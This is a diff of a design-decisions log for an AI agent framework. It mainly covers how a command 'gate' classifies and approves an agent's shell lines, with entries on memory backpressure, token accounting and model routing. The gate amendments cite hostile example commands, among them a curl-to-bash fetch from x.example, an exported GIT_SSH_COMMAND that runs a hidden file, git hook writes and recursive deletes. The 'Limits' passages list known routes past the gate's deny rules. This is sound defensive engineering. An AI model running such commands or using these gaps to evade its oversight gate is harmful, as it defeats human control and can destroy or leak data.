+  hook refuses a standing grant for the line's category when one of them lies outside the grant; it compares the targets
+  as written, and only the decision's ledger view redacts URL userinfo. `ssh` options are read as getopt reads them, so
+  a value-taking letter at the end of a cluster (`-vp 22`) or `-B`/`-P`/`-I` no longer puts the option's value in the
+  host's place; such a line asks, and wherever the gate now reads another host than it used to, the line asks and
+  both readings' parts are matched. A `--` right after the `ssh` host ends the options. `mosh` options are read as mosh's
+  Perl Getopt::Long reads them in its default mode, against mosh's own option list: one or two dashes or `+`, any
+  case, a unique prefix, `=value` or the next word, options after the host, `--` ending them, and mosh's own short
+  options (`-o` takes no value, `-l` is `--local`). A word that names no single option stops mosh and the line asks.
+  The command given to `mosh --ssh`, `--client` or `--server` is read as a command and the line asks (the `--ssh` and
+  `--client` helpers run locally and keep their own exposure; `--server` runs on the remote host, and with `--local`
+  the server and the command run locally too, so nothing on the line is `internal`). Another option's value that
+  reads as `--server`, `--ssh` or `--client` (`--port '--server=...'`) is not run by mosh, but the gate read it as
+  the command before, so it still does and the line asks. Words after the host that mosh takes as options or values
+  are also read as the command and the line asks, since with `POSIXLY_CORRECT` set mosh runs them as the command;
+  the same holds where the host the gate reads changed. The
+  ledger view of a classification (`as_dict`) leaves the parts out, so approval bindings and trace rows are unchanged.
+  *Amendment 2026-10-19 (issue #191):* a `categories: {X: deny}` line or a rule with `decision: deny` was still
+  checked against the dominant part only, so `echo $(git push origin main) > /tmp/f` was `log` under
+  `categories: {local_write: deny}` while `deny: [local_write]` denied it. Now `decide` also decides each part
+  below the combined result as it would decide that command alone, by its category's line and then the first rule
+  that matches it (plus a deny rule whose `command` regex matches a decoded view of the line, #136); a `deny`
+  there denies the line, and the reason names the part. Only a deny reaches the parts: allow, log and ask lines
+  and rules keep deciding by the dominant part, and `reserved` stays the way to ask on any part. A deny on a
+  command the gate cannot read still becomes an ask (Limits below). Rejected: the most restrictive category line over all parts (a lower line on the dominant part would no longer
+  apply, and an allow rule on a part's target would stop counting).
+  *Amendment 2026-10-20 (issue #394):* a rule's `command` regex saw the whole line, for the combined result and for
+  every part. That is right for a veto (#136), but an allow or log rule written for one command then lowered lines
+  whose deciding command it did not name. `{command: '^git status', decision: allow}` allowed
+  `git status; git push --force origin main`, also under `categories: {force_push: deny}`, although the push alone
+  asks or is denied. In the #191 pass `{command: 'rm -rf build', decision: allow}` lifted
+  `categories: {github_post: deny}` from the post in `gh pr comment 3 --body hi && rm -rf build`. The fix may only
+  make a decision stricter than before or leave it alone, for any line, tool, policy or context, and it does so by
+  construction. A rule keyed on `command` that would lower a compound line must match the line as before, and its
+  regex must also name the line's commands. A rule would lower the line when its decision is below the line's matrix
+  cell and category line (an allow or log rule over an ask cell, an ask rule under a category deny), or when it is an
+  allow or log rule that names `opaque_exec`, which lowers the indirection floor. Its regex must then also match the
+  own text (`Classification.own`) of every part that carries the line's category or is as severe as the combined
+  result, of every other part that alone would get a stricter outcome than the rule gives (a rider), and of every
+  command that changes the shell for later commands on the line (a setter, `Classification.setters`). A rule that
+  fails is passed over and the first-match walk goes on, but the rule step keeps the stricter of the first match, as
+  before, and the rule found after it. A rule passed over never names `opaque_exec` for the floor, and a later rule
+  names it only when the first match does too. In the #191 pass an allow, log or ask rule keyed on `command` counts
+  for a part only when its regex also matches that part's own text. Deny rules and the #136 veto match there as
+  before, so every part denied before is denied now. Each step keeps the stricter outcome, so this pass is never
+  looser than before. When it passes a rule over, the gate also decides the line as before, and that decision stands,
+  reason and all, unless the new one is stricter. This pass reads rules and patterns that deciding as before never
+  reaches (the walk past a rule passed over, each regex of a matched list), so when it fails, for example on a bad
+  regex, the gate decides the line as before, which fails only where it failed before.
+  Rules that keep or raise the line (a log rule over an allow cell, an
+  ask or deny rule over a lower cell) and `reserved:` and `deny:` entries match the whole line and its decoded views
+  as before. A line the gate reads as one part is matched on its command text as before. So is a line of one
+  simple command whose other parts the gate made for it with no own text (a secret path it names in
+  `cat ~/.kube/config`, a string literal in its code): no two of its parts have different own texts, so a rule that
+  matches the line names its one command, and the line is decided as before. The ledger view (`as_dict`)
+  leaves the own text and the setters out, so approval bindings and trace rows are unchanged. A part's own text is its
+  simple command as written, with its redirections, after leading reserved words such as `then`. A prefix such as
+  `sudo`, `env` or `timeout` stays in it. A nested command (`$( )`, backticks, `<( )`, a heredoc or `bash -c` string a
+  shell runs, `eval`, an `ssh` remote command) has its text in that nested line. A shell, an interpreter, `ssh` or
+  `xargs` that runs its stdin has the pipeline from its first command as its text when simple commands pipe into it,
+  and none when a compound feeds it. Those texts hold at most four times the line's length plus 4 KB between them,
+  and a reader past that has none, since each holds every command before its reader. So
+  `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh` but not
+  `bash build.sh && curl -s https://x.example/i.sh | bash`. A shell in a nested line that sets no stdin of its own
+  takes the text of the command around it, whose stdin it reads
+  (`printf '...' | ssh prod-db bash`). Each stdin text is read once per line, as before, since each read spends the
+  call's budgets. A later command that reads the same text (`psql -d prod` in `{ psql -d test; psql -d prod; } <<EOF`)
+  gets copies of the first reader's parts with its own text where the first reader's stood. A part the
+  gate makes up, a nest past a depth or nesting cap, the opaque_exec reading of a `$".."` line and a string literal in
+  code (a guess at a command) have none, and on a line of more than one command a part with no own text matches no
+  such rule. In code (`execute_code`,
+  `python -c`) the code part and a recognized call (`shutil.rmtree`, `requests.post`) carry the code's text, or the
+  command that runs it. A command the gate finds run inside another is a part of its own and must be named too: an
+  `eval`, `bash -c` or `ssh` string (`eval "$CMD"` runs `$CMD`, so `'^eval'` alone no longer allows it), an `-x` or
+  `--exec` value, an environment value read as a command (`GIT_SSH_COMMAND`). A rider alone is the part without the
+  parts it was built from, on its own text, decided once with no rules and once with all of them, the stricter kept.
+  So under `{command: 'git push --force origin main', decision: allow}`, which matched each of these lines on main,
+  the push now asks beside a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`,
+  `aws s3 rm --recursive`), a post to a third party (`gh pr comment`), `vercel deploy --prod`, `git reset --hard`, an
+  unknown program, an `ssh -o ProxyCommand` or a function body that shadows `git`, and where a copy of the push that
+  never runs stands in for it (`if false; then ...; fi`, an exported value, `PS4`). Equally severe commands are
+  matched together, so the outcome does not depend on which comes first. The setters are an assignment with no
+  command, `export` and the other declaring builtins with an operand, `set -a`/`-k`/`--`, `shopt -s`, `printf -v`,
+  `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source`, `.`,
+  `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a function definition (no own
+  text) and a program name the gate cannot read. Each is allowed alone, and a bash call starts a fresh shell, so only
+  a later command on the same line sees the change:
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"; git push --force origin main` runs whatever is in /tmp/cmd. Main allowed
+  it under the rule above, and now it asks. `cd` is left off the list, so `cd repo && git push --force origin main`
+  stays allowed under that rule. That cannot loosen a decision, since the rule must still match the whole line:
+  `cd /tmp/evil && make test` asks under `'^make test$'`, as before. An anchored rule such as
+  `'^git push --force origin main$'` still matches no compound line, as before. A rule written for a whole compound
+  line, such as `'^git push origin main && git push origin dev$'`, now also has to name each command, for example as
+  `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`, and until it does the line gets
+  its matrix or category outcome (here log).
+  Limits: a command that would be allowed alone still rides on the rule's outcome, as before and as a less severe
+  command does under a category line. `cd /tmp/other && git push --force origin main` and
+  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under the unanchored rule above. A
+  `deny:` or `reserved:` entry, or a category line or rule that denies that command, still stops it. Rejected:
+  matching an allow or log rule on the deciding command's own text instead of the whole line (a draft of this fix). An
+  anchored rule then matched lines it never matched before: `'^make test$'` allowed `cd /tmp/evil && make test`, which
+  runs another Makefile, where main asked, and `'^rm -rf build$'` lifted `categories: {delete: deny}` from
+  `git push --force origin main && rm -rf build`. Also rejected: matching ask and deny rules and the lists on own text
+  instead of the whole line (that narrows a veto: an ask rule on `gh pr comment` would no longer ask for
+  `gh pr comment 3 --body hi && rm -rf build` under `categories: {delete: allow}`), deciding every part alone with the
+  strictest outcome winning (rejected above for category lines), and judging a rider under every rule (a second allow
+  rule would then lower it, so `rm -rf build && git push --force origin main` would pass under two allow rules, one
+  per command, where it asks now).
+  *Amendment 2026-10-21 (issue #396):* the posting checks still read the dominant part only. `decide` ran the
+  footer, the forbidden words and the scrub on the combined result's text, which a compound line takes from its most
+  severe part. So a post that passed, put first, carried a second post past all three. Under footer `F` and the
+  forbidden word `Zork`, `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R myorg/app --body 'Zork'`
+  logged, while the second post alone asks. Now the posting rules read every part. A part is checked, at its own
+  exposure, when its category is under `posting.applies_to` or it is a close or merge carrying text (#326, #397),
+  and it carries text, a title or an unseen body. The dominant part's violations stay bare. Another part's are named
+  after it. A part's unseen body is its own `unseen_body` signal, read from the signals it carried before `_combine`
+  gave it every part's (`Classification.own_signals`, left out of the ledger view). So two unseen posts are both
+  named. Once other parts add violations, a decision lists at most 20 and counts the rest. The dominant part's own
+  violations are always all listed. So is the line-wide unseen-body note for a part the posting rules do not cover.
+  The scrub compiles its patterns once per policy, since a line now runs it once per post. The posting step only
+  adds violations, so no decision is looser than before. The gate differential
+  (#423) bears that out. Over 25,497 actions x 85 policies (the built-in set and nine posting policies) it lowered
+  0 pairs and tightened 1,295, each a `github_post` line going from log or allow to ask. Third-party escalation,
+  the matrix cell and the floors still read the dominant part. So `gh pr comment 5 -R myorg/app --body $'ok\nF' &&
+  gh pr comment 6 -R other/repo --body $'fine\nF'` logs, while the second post alone asks for a third party. That
+  is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
+  lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
+  the card and the ledger repeat).
+- **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
+  `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
+  under two policies while a change is pending).
+- **Limits:** a literal inside `python -c` or `execute_code` counts only when one of its commands classifies as a
+  non-benign category (an all-`web_read` or all-`local_write` literal is dropped), and code can reach a target with
+  no literal at all. Deny → ask: where the gate cannot read the command it files the line as `opaque_exec`, so a
+  `deny` on the hidden action becomes an `ask`, for example a heredoc after a `coproc` block (the rest of `coproc` is
+  read since #140 / #181), nesting past the depth cap (#137, #141), `eval $(...)`, a command arriving on stdin
+  (`echo ... | xargs -I{} sh -c '{}'`) and the
+  wrappers `watch`, `parallel`, `tmux`, `screen` and `setsid`; the list is not closed. Deny → allow: the fallback
+  has gaps where the line is `allow` outright even under `deny`: `${...}` bodies, which the lexer does not read
+  (#143; open PR #158). Since #164 an `ssh`/`mosh` chain past the hop cap asks (#153) and command-valued options of
+  allowlisted programs are read (#154).
+- **Revisit if:** a principal wants a denied action to be allowed when it is part of a longer line. None asked;
+  the entry format says "no agent may take" the action.
 
 ## D-077 (2026-10-15) Core budget: a ratchet with headroom, functionality and robustness first
 - **Status:** Accepted 2026-10-15. The principal's ruling: "important to be lean and optimized but not at the cost of
@@ -1468,5 +2547,107 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   merge from main). Main (859fbcc) is at 14,999, so 814 lines are left. No source changed.
 - **Revisit if:** the headroom is raised more than once for non-security work, or the floor stops falling for a long time.
 - **Validation:** the budget test, `tests/docs`, `tests/test_privacy.py`, `tests/test_versioning.py`, `ruff check`.
+- *2026-10-19 (#314, fixes #242):* CORE_HEADROOM raised by 58 to 1,058 for the serve start lock, a robustness fix; the lead schedules a reduction this week.
+- **Amendment 2026-10-19 (reduction, #332):** a no-behavior-change reduction (dead code, merged duplicates, shorter equivalent forms) took the counted core from 15,870 on main to 15,776 (94 lines; it was 15,800 before #314). `CORE_FLOOR` stays 14,813: the count was already above the floor, and the floor never goes up, so setting it to the new count would have lifted the ceiling by about 960 lines. `CORE_HEADROOM` is back at 1,000 after #314's temporary raise to 1,058, so the rule-4 raise is undone by the reduction it called for. Ceiling 15,813, headroom left 37.
+- *2026-10-20 (#346, follow-up to #321):* CORE_HEADROOM raised by 29 to 1,029 for the job notice fixes (key redaction and event loop robustness). The lead schedules a reduction this week.
+- **Amendment 2026-10-20 (reduction, #373):** a no-behaviour-change reduction (dead overrides, merged duplicates, an exception clause the following handler could never reach, shorter equivalent forms) took the counted core from 15,841 on main to 15,801 (40 lines). `CORE_FLOOR` stays 14,813: the count is above the floor, and the floor never goes up. `CORE_HEADROOM` is back at 1,000 after #346's temporary raise to 1,029, so the rule-4 raise is undone by the reduction it called for. Ceiling 15,813, headroom left 12.
 - **Docs:** `docs/ENGINE-SPLIT.md` "Budget policy", `docs/CORE.md`, `docs/DEVELOPER-GUIDE.md` §7, `docs/WHITEPAPER.md`
   §11 and §27, `CHANGELOG.md`.
+
+## D-079 (2026-10-16) A stalled event subscriber is ended and resumes with since
+- **Status:** Accepted 2026-10-16.
+- **Why:** `Hub.publish` put every event in an unbounded queue per subscriber. A client that stops reading blocks
+  its SSE loop in `drain()`, so its queue grew one for one with the stream and one stalled client could grow the
+  core's memory without bound (the audit of main 35b7de8 left 29,792 of 30,000 notices queued).
+- **Decision:** a subscriber whose queue holds `MAX_LAG` (4,096) unread events is ended on the next publish. The hub
+  drops what it has not read and queues the end marker it already uses on shutdown, so the stream closes right after
+  the last event the client read and the publisher never waits. `Hub.closed` tells this close from a shutdown.
+  - Every client in the repo resumes with `since`: the protocol client with `reconnect`, the exo-bus link, the
+    terminal window's `LocalClient` and stdio `serve_lines` (they subscribe again until the hub closes, so a window
+    that took over keeps its core), and `exo web`, whose re-bootstrap replays from the last event it applied. It
+    does so for up to `4 * MAX_LAG` (16,384) missed events. A longer gap, such as a long outage while the core kept
+    working, replays the newest 5,000 as on start, so one response never carries an unbounded backlog (a
+    100,000-event gap took 2 s in one reply).
+  - A reader that keeps up must stay far below the cap. Tool threads hand output to the loop with
+    `call_soon_threadsafe`, and every callback queued between two loop turns runs before any reader does. On main one
+    chatty shell command queued 7,946 publishes in one turn. `run_tool` now joins a thread's chunks into one
+    `tool.output` per loop turn, so a turn publishes a handful: a delta per provider chunk, an output per running tool.
+- **Rejected:** dropping the oldest events, since a gap with no close corrupts a client's view. Blocking the
+  publisher, since one slow client would stall every turn and every other client. Refilling the stalled
+  subscription from the event log inside the hub, which hides the stall from a remote client and moves reconnect
+  logic into the hub. Closing on a stall measured in seconds, since one long loop turn looks the same and memory
+  still grows while the timer runs.
+- **Revisit if:** a client that keeps up is ever ended in normal use, or new code publishes from a thread once per
+  item instead of once per loop turn.
+- **Docs:** `docs/CORE-V2-INTERFACES.md` `events.subscribe` and `tool.output`, `docs/STANDALONE.md` §5.1,
+  `docs/ui/WEB.md`, `plugins/exo-command/README.md`, `CHANGELOG.md`.
+
+## D-080 (2026-10-16) One meaning for `Usage.input_tokens`, and what the per-child token budget counts
+- **Status:** Accepted 2026-10-16. It replaces the `input_includes_cache` flag that D-032 #6 added for pricing.
+- **Why:** the two transports filled `Usage.input_tokens` differently. Anthropic reports only the uncached input,
+  with cache reads and writes apart. The OpenAI transport copied `prompt_tokens`, which already holds the cached
+  tokens. Only pricing knew. Every other reader assumed one meaning and got the other half the time:
+  - The delegate budget (200,000 tokens per child) counted `input + output`. On Anthropic, where caching is on by
+    default, it ignored the cached context and barely acted. On OpenAI-style routes it counted the whole cached
+    prompt on every call, and a child with a 92k prompt was stopped after 3 calls.
+  - The TUI context gauge read about double on OpenAI routes (182,012 for a 92,012-token prompt), and the cache
+    share read 49% where 98% was real.
+  - Context-engine plugins got `prompt_tokens` = `input_tokens`, so on Anthropic they saw only the uncached tail
+    and usage-driven compression never fired.
+- **Decision:**
+  - `input_tokens` is the uncached input on every transport. Cache reads and writes are counted apart, so the
+    prompt a call sent is the sum of the three. The OpenAI transport reports `prompt_tokens - cached_tokens` as
+    input and the cached count as cache reads. A cached count it cannot split (above the prompt, negative, not
+    an integer) makes the usage incomplete, so the spend boundary refuses it and keeps the reservation. Without a
+    spend policy the whole prompt stays uncached input. The router prices `input_tokens` directly. Cost and
+    settled spend are unchanged on both transports.
+  - The per-child budget counts what the child newly processes: uncached input plus cache writes plus output.
+    Cache reads do not count. The receipt's tokens in are the same count.
+  - Readers that need the prompt size add the three counters: the TUI and web context gauges, the cache share
+    (cache reads over the whole prompt), and the `prompt_tokens` handed to context engines.
+  - A context engine gets the usage of the turn's last model call (`TurnResult.last_usage`), so `prompt_tokens`
+    is one prompt. The turn's sum would count the cached context once per call: three calls of a 30k prompt read
+    as 90k, so a 75% threshold could fire after one tool-using turn with the window less than a third full.
+- **Rejected:**
+  - Keeping the flag and teaching every reader about it: each new reader would have to know, and four did not.
+  - Counting all context processed (`input + cache read + cache write + output`) for the budget: every round
+    re-reads the cached context, so a child re-reading 25k tokens a round would stop after about 8 rounds, where
+    today it effectively never stops on the default provider.
+  - Counting only uncached input plus output: cache writes are new tokens at a higher price, and leaving them
+    out keeps the budget blind on Anthropic.
+- **Revisit if:** a transport reports cache counters in yet another shape, or children hit `budget` on routes that
+  report no cache counts at all (local servers with their own prompt cache), where every call's full prompt counts.
+- **Follow-up:** `spend.py` and `billing.Price.actual` still take an `includes_cache` argument, now always false.
+  Remove it once PR #129 (tiered spend rates, same files) lands.
+- **Validation:** `tests/core/models` (transport split, router price, spend settlement), `tests/agents`,
+  `tests/clients/tui`, `tests/core/plugins`, `tests/trace`, the core budget test, `ruff check`, the mypy baseline.
+- **Docs:** `docs/TRACE.md` "Cost", `docs/MODEL-SPEND.md`, `docs/CORE-V2-INTERFACES.md`, `docs/AGENT-WIRE.md`
+  "Limits", `docs/UI.md`, `CHANGELOG.md`.
+
+## D-081 (2026-10-17) The gate's decision call never uses the main model
+- **Status:** Accepted 2026-10-17 by the lead (reversible). It amends D-019 for the gate only. The gate's chain is
+  Jev, then local Laya, then `aux`. `exo decide` and the baseline export's judge keep the full chain, `main` last.
+- **Why:** a user-readiness audit of main 35b7de8 found that with only the claude CLI on PATH (the route Exo picks
+  for anyone with Claude Code and no key), every tool call the rules allowed started a hidden main-model call. Each
+  one added 2 to 10 s and was missing from `/trace` and cost. When one failed, the router cooled the one CLI login,
+  and the user's next turn failed with "all routes for 'main' failed or are cooling down" for about 60 s. D-015
+  already rejected "a frontier model for every small decision (cost, latency)". The fallback to `main` made it the
+  default on the CLI route.
+- **Decision:** `ask_choice_result(..., spare="main")` skips every route in the `main` chain, including one also
+  listed under `aux`. A failure on that call cools only the model that failed (`credential|model`), never the
+  credential. The gate passes it on every call. With no decision or aux route the gate keeps the rule outcome, as
+  it already did on a failure or a timeout. Exo's own read-only tools (`skill`, `memory_zoom`, `exo_trace`, `ui`)
+  are `read` in `gate.TOOLS`.
+- **Rejected:**
+  - Dropping `main` from `ROLE_FALLBACK["decision"]` for every caller. It changes `exo decide` and the baseline
+    judge, which run once per command, not once per tool call.
+  - Skipping the decision call for `read` tools only. Writes, shell and web calls would still wait on the main
+    model and could still cool its login.
+  - Keeping `main` and only cooling per model. Every tool call would still pay for a main-model call.
+  - No cooling at all on a side call. A failing aux model would be retried on every tool call.
+- **Revisit if:** a local decision model ships by default (exo-decide, or Laya from the installer), or a principal
+  wants the main model's second opinion on the gate. That would be an explicit setting, not the fallback.
+- **Validation:** `plugins/exo-gate/tests/test_exo_gate_side_calls.py`, `tests/core/models/test_decision_spare.py`,
+  and a first launch from a clean home with the claude CLI: no approval card for the intro skill, no decision
+  call to the CLI, and read-only tool calls at 0.0 s.
+- **Docs:** `docs/GATE.md` "The decision model's second opinion", `docs/PROVIDERS.md` "Roles", `CHANGELOG.md`.
